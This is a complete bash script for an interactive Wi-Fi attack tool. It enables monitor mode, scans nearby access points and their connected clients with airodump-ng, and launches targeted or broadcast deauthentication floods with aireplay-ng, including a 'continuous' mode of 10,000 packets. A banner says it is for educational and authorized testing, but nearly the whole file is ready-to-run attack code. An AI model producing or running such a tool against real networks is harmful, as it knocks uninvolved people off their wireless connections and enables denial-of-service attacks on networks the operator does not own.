#!/bin/bash

# =====================================================
# Advanced Wi-Fi Network Scanner and Targeted Disconnector
# For educational and authorized penetration testing only
# Created: $(date)
# =====================================================

# Color codes for better readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# Global variables
TEMP_DIR="/tmp/wifi_toolkit"
AP_LIST_FILE="$TEMP_DIR/ap_list.csv"
CLIENT_LIST_FILE="$TEMP_DIR/client_list.csv"
MONITOR_INTERFACE=""
ORIGINAL_INTERFACE=""
SELECTED_AP_BSSID=""
SELECTED_AP_CHANNEL=""
SELECTED_AP_ESSID=""

# Banner
show_banner() {
    clear
    echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║                                                               ║${NC}"
    echo -e "${BLUE}║${GREEN}  Advanced Wi-Fi Network Scanner and Targeted Disconnector  ${BLUE}║${NC}"
    echo -e "${BLUE}║${YELLOW}       For Educational and Authorized Testing Only         ${BLUE}║${NC}"
    echo -e "${BLUE}║                                                               ║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${RED}⚠️  WARNING: Unauthorized use of this tool may be illegal.${NC}"
    echo -e "${RED}⚠️  Only use on networks you own or have explicit permission to test.${NC}"
    echo
}

# Check if script is run as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}This script must be run as root (sudo)${NC}"
        exit 1
    fi
}

# Check for required tools and install if missing
check_dependencies() {
    local tools=("aircrack-ng" "airodump-ng" "aireplay-ng" "airmon-ng" "iwconfig" "python3" "pip3")
    local python_modules=("scapy" "rich")
    local missing_tools=()
    local missing_modules=()
    
    echo -e "${BLUE}Checking for required tools...${NC}"
    
    # Check for system tools
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done
    
    # Check for Python modules
    for module in "${python_modules[@]}"; do
        if ! python3 -c "import $module" &> /dev/null; then
            missing_modules+=("$module")
        fi
    done
    
    # Install missing tools
    if [ ${#missing_tools[@]} -ne 0 ]; then
        echo -e "${YELLOW}Missing tools: ${missing_tools[*]}${NC}"
        echo -e "${BLUE}Installing missing tools...${NC}"
        apt-get update
        for tool in "${missing_tools[@]}"; do
            apt-get install -y "$tool"
        done
    fi
    
    # Install missing Python modules
    if [ ${#missing_modules[@]} -ne 0 ]; then
        echo -e "${YELLOW}Missing Python modules: ${missing_modules[*]}${NC}"
        echo -e "${BLUE}Installing missing Python modules...${NC}"
        for module in "${missing_modules[@]}"; do
            pip3 install "$module"
        done
    fi
    
    echo -e "${GREEN}All dependencies are installed.${NC}"
}

# Create temporary directory
setup_environment() {
    mkdir -p "$TEMP_DIR"
    # Ensure clean files
    > "$AP_LIST_FILE"
    > "$CLIENT_LIST_FILE"
}

# Clean up on exit
cleanup() {
    echo -e "\n${BLUE}Cleaning up...${NC}"
    
    # Stop monitoring if active
    if [ ! -z "$MONITOR_INTERFACE" ]; then
        echo -e "${YELLOW}Stopping monitor mode on $MONITOR_INTERFACE...${NC}"
        airmon-ng stop "$MONITOR_INTERFACE" > /dev/null 2>&1
    fi
    
    # Restart network manager if needed
    echo -e "${YELLOW}Restarting network services...${NC}"
    service NetworkManager restart > /dev/null 2>&1
    
    # Remove temporary files
    rm -rf "$TEMP_DIR"
    
    echo -e "${GREEN}Cleanup complete. Exiting.${NC}"
    exit 0
}

# Set up trap to ensure cleanup on exit
trap cleanup EXIT INT TERM

# Get available wireless interfaces
get_wireless_interfaces() {
    local interfaces=()
    local ifaces=$(iwconfig 2>/dev/null | grep -o "^[a-zA-Z0-9]*" | grep -v "lo")
    
    for iface in $ifaces; do
        if iwconfig "$iface" 2>/dev/null | grep -q "IEEE 802.11"; then
            interfaces+=("$iface")
        fi
    done
    
    echo "${interfaces[@]}"
}

# Enable monitor mode on selected interface
enable_monitor_mode() {
    local interface=$1
    
    echo -e "${BLUE}Enabling monitor mode on $interface...${NC}"
    
    # Kill processes that might interfere
    airmon-ng check kill > /dev/null 2>&1
    
    # Start monitor mode
    local result=$(airmon-ng start "$interface" | grep "monitor mode" | grep -o "[a-zA-Z0-9]*mon")
    
    if [ -z "$result" ]; then
        # Try alternative naming convention
        result="${interface}mon"
        # Check if interface exists
        if ! iwconfig "$result" &> /dev/null; then
            echo -e "${RED}Failed to enable monitor mode. Please check your wireless adapter.${NC}"
            exit 1
        fi
    fi
    
    echo -e "${GREEN}Monitor mode enabled: $result${NC}"
    MONITOR_INTERFACE="$result"
    ORIGINAL_INTERFACE="$interface"
}

# Scan for nearby access points
scan_access_points() {
    echo -e "${BLUE}Scanning for nearby access points...${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop scanning when you see the target AP.${NC}"
    
    # Start airodump-ng to scan for APs
    timeout 15 airodump-ng --output-format csv --write "$TEMP_DIR/ap_scan" "$MONITOR_INTERFACE" > /dev/null 2>&1
    
    # Process the CSV file to extract AP information
    if [ -f "$TEMP_DIR/ap_scan-01.csv" ]; then
        # Extract AP information (BSSID, Channel, ESSID)
        grep -a -v "Station MAC" "$TEMP_DIR/ap_scan-01.csv" | grep -a "," | head -n -1 > "$AP_LIST_FILE"
        
        # Count APs found
        local ap_count=$(wc -l < "$AP_LIST_FILE")
        echo -e "${GREEN}Found $ap_count access points.${NC}"
    else
        echo -e "${RED}No scan results found. Try again.${NC}"
        return 1
    fi
}

# Display access points in a menu
display_ap_menu() {
    local i=1
    local ap_array=()
    
    echo -e "\n${BLUE}=== Available Access Points ===${NC}"
    echo -e "${PURPLE}ID\tBSSID\t\t\tCH\tSignal\tESSID${NC}"
    
    while IFS=, read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv essid; do
        # Clean up the data
        bssid=$(echo "$bssid" | tr -d ' ')
        channel=$(echo "$channel" | tr -d ' ')
        power=$(echo "$power" | tr -d ' ')
        essid=$(echo "$essid" | tr -d ' ')
        
        # Store in array for selection
        ap_array+=("$bssid,$channel,$essid")
        
        # Display with formatting
        printf "${GREEN}%2d\t${NC}%s\t%2s\t%3s\t%s\n" "$i" "$bssid" "$channel" "$power" "$essid"
        
        i=$((i+1))
    done < "$AP_LIST_FILE"
    
    # Select an AP
    echo
    echo -n -e "${YELLOW}Select an access point (1-$((i-1))): ${NC}"
    read -r ap_choice
    
    # Validate choice
    if ! [[ "$ap_choice" =~ ^[0-9]+$ ]] || [ "$ap_choice" -lt 1 ] || [ "$ap_choice" -ge "$i" ]; then
        echo -e "${RED}Invalid choice.${NC}"
        return 1
    fi
    
    # Extract selected AP info
    IFS=, read -r SELECTED_AP_BSSID SELECTED_AP_CHANNEL SELECTED_AP_ESSID <<< "${ap_array[$((ap_choice-1))]}"
    
    echo -e "${GREEN}Selected: $SELECTED_AP_ESSID (BSSID: $SELECTED_AP_BSSID, Channel: $SELECTED_AP_CHANNEL)${NC}"
}

# Scan for clients connected to the selected AP
scan_clients() {
    echo -e "${BLUE}Scanning for clients connected to $SELECTED_AP_ESSID...${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop scanning when you see connected clients.${NC}"
    
    # Start airodump-ng to scan for clients on the selected AP
    timeout 20 airodump-ng --output-format csv --write "$TEMP_DIR/client_scan" --bssid "$SELECTED_AP_BSSID" --channel "$SELECTED_AP_CHANNEL" "$MONITOR_INTERFACE" > /dev/null 2>&1
    
    # Process the CSV file to extract client information
    if [ -f "$TEMP_DIR/client_scan-01.csv" ]; then
        # Extract client information (Station MAC, Power, etc.)
        grep -a "Station MAC" -A 100 "$TEMP_DIR/client_scan-01.csv" | grep -a -v "Station MAC" | grep -a "," > "$CLIENT_LIST_FILE"
        
        # Count clients found
        local client_count=$(wc -l < "$CLIENT_LIST_FILE")
        
        if [ "$client_count" -eq 0 ]; then
            echo -e "${YELLOW}No clients found connected to this AP.${NC}"
            return 1
        else
            echo -e "${GREEN}Found $client_count connected clients.${NC}"
        fi
    else
        echo -e "${RED}No scan results found. Try again.${NC}"
        return 1
    fi
}

# Display clients in a menu
display_client_menu() {
    local i=1
    local client_array=()
    
    echo -e "\n${BLUE}=== Connected Clients to $SELECTED_AP_ESSID ===${NC}"
    echo -e "${PURPLE}ID\tMAC Address\t\tSignal\tData Packets${NC}"
    
    while IFS=, read -r station first_time last_time power packets bssid probed; do
        # Clean up the data
        station=$(echo "$station" | tr -d ' ')
        power=$(echo "$power" | tr -d ' ')
        packets=$(echo "$packets" | tr -d ' ')
        
        # Store in array for selection
        client_array+=("$station")
        
        # Display with formatting
        printf "${GREEN}%2d\t${NC}%s\t%3s\t%s\n" "$i" "$station" "$power" "$packets"
        
        i=$((i+1))
    done < "$CLIENT_LIST_FILE"
    
    # Option to target all clients
    echo -e "${GREEN}$i\t${NC}ALL CLIENTS (Broadcast deauth)"
    
    # Select a client
    echo
    echo -n -e "${YELLOW}Select a client to disconnect (1-$i): ${NC}"
    read -r client_choice
    
    # Validate choice
    if ! [[ "$client_choice" =~ ^[0-9]+$ ]] || [ "$client_choice" -lt 1 ] || [ "$client_choice" -gt "$i" ]; then
        echo -e "${RED}Invalid choice.${NC}"
        return 1
    fi
    
    # Handle broadcast deauth (all clients)
    if [ "$client_choice" -eq "$i" ]; then
        perform_deauth "FF:FF:FF:FF:FF:FF" "broadcast"
    else
        # Extract selected client MAC
        local selected_client="${client_array[$((client_choice-1))]}"
        perform_deauth "$selected_client" "targeted"
    fi
}

# Perform deauthentication attack
perform_deauth() {
    local target_mac=$1
    local attack_type=$2
    local deauth_count
    local attack_mode
    
    # Ask for deauth count
    echo -n -e "${YELLOW}Enter number of deauth packets (0 for continuous): ${NC}"
    read -r deauth_count
    
    # Validate input
    if ! [[ "$deauth_count" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}Invalid input. Using default (5 packets).${NC}"
        deauth_count=5
    fi
    
    # Set attack mode
    if [ "$deauth_count" -eq 0 ]; then
        attack_mode="continuous"
        # For continuous mode, use a reasonable number that will run for a while
        deauth_count=10000
    else
        attack_mode="burst"
    fi
    
    # Confirm before attacking
    echo -e "${RED}Ready to perform $attack_mode $attack_type deauthentication attack.${NC}"
    echo -e "${RED}Target: ${attack_type} (${target_mac})${NC}"
    echo -e "${RED}Access Point: $SELECTED_AP_ESSID ($SELECTED_AP_BSSID)${NC}"
    echo -n -e "${RED}Continue? (y/n): ${NC}"
    read -r confirm
    
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        echo -e "${YELLOW}Attack cancelled.${NC}"
        return
    fi
    
    echo -e "${YELLOW}Executing deauthentication attack...${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop the attack.${NC}"
    
    if [ "$attack_type" = "broadcast" ]; then
        # Broadcast deauth (all clients)
        aireplay-ng --deauth "$deauth_count" -a "$SELECTED_AP_BSSID" "$MONITOR_INTERFACE"
    else
        # Targeted deauth (specific client)
        aireplay-ng --deauth "$deauth_count" -a "$SELECTED_AP_BSSID" -c "$target_mac" "$MONITOR_INTERFACE"
    fi
    
    echo -e "${GREEN}Deauthentication attack completed.${NC}"
}

# Main menu
show_main_menu() {
    echo -e "${BLUE}===== Advanced Wi-Fi Toolkit =====${NC}"
    echo -e "${GREEN}1. Select wireless interface${NC}"
    echo -e "${GREEN}2. Scan for access points${NC}"
    echo -e "${GREEN}3. Scan for clients on selected AP${NC}"
    echo -e "${GREEN}4. Perform deauthentication attack${NC}"
    echo -e "${RED}5. Exit${NC}"
    echo
    echo -n -e "${YELLOW}Enter your choice [1-5]: ${NC}"
}

# Main function
main() {
    local choice
    local interfaces
    local interface_count
    local interface_choice
    
    # Initial setup
    show_banner
    check_root
    check_dependencies
    setup_environment
    
    while true; do
        show_main_menu
        read -r choice
        
        case $choice in
            1)
                # Select wireless interface
                interfaces=($(get_wireless_interfaces))
                interface_count=${#interfaces[@]}
                
                if [ "$interface_count" -eq 0 ]; then
                    echo -e "${RED}No wireless interfaces found.${NC}"
                    continue
                fi
                
                echo -e "${BLUE}Available wireless interfaces:${NC}"
                for ((i=0; i<interface_count; i++)); do
                    echo -e "${GREEN}$((i+1)). ${interfaces[$i]}${NC}"
                done
                
                echo -n -e "${YELLOW}Select interface [1-$interface_count]: ${NC}"
                read -r interface_choice
                
                if ! [[ "$interface_choice" =~ ^[0-9]+$ ]] || [ "$interface_choice" -lt 1 ] || [ "$interface_choice" -gt "$interface_count" ]; then
                    echo -e "${RED}Invalid choice.${NC}"
                    continue
                fi
                
                enable_monitor_mode "${interfaces[$((interface_choice-1))]}"
                ;;
            2)
                # Scan for access points
                if [ -z "$MONITOR_INTERFACE" ]; then
                    echo -e "${RED}Please select a wireless interface first.${NC}"
                    continue
                fi
                
                scan_access_points && display_ap_menu
                ;;
            3)
                # Scan for clients
                if [ -z "$SELECTED_AP_BSSID" ]; then
                    echo -e "${RED}Please select an access point first.${NC}"
                    continue
                fi
                
                scan_clients
                ;;
            4)
                # Perform deauthentication attack
                if [ -z "$SELECTED_AP_BSSID" ]; then
                    echo -e "${RED}Please select an access point first.${NC}"
                    continue
                fi
                
                if [ ! -s "$CLIENT_LIST_FILE" ]; then
                    echo -e "${RED}No clients found. Please scan for clients first.${NC}"
                    continue
                fi
                
                display_client_menu
                ;;
            5)
                # Exit
                echo -e "${GREEN}Exiting...${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid choice. Please try again.${NC}"
                ;;
        esac
        
        echo
        echo -n -e "${YELLOW}Press Enter to continue...${NC}"
        read
        clear
        show_banner
    done
}

# Start the program
main
